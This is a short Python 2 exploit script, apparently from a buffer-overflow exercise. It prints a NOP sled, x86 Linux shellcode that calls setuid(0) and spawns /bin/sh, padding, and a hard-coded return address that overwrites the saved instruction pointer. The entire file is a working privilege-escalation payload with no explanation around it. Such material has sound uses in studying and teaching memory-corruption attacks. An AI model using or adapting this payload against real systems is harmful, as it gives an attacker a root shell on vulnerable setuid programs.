#!/usr/bin/python


nop_length = 64
nop = '\x90' * nop_length
shellcode = (
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)

padding = '*' * (112 - 64 - 32)
eip = '\x70\xf1\xff\xbf'
print nop + shellcode + padding + eip
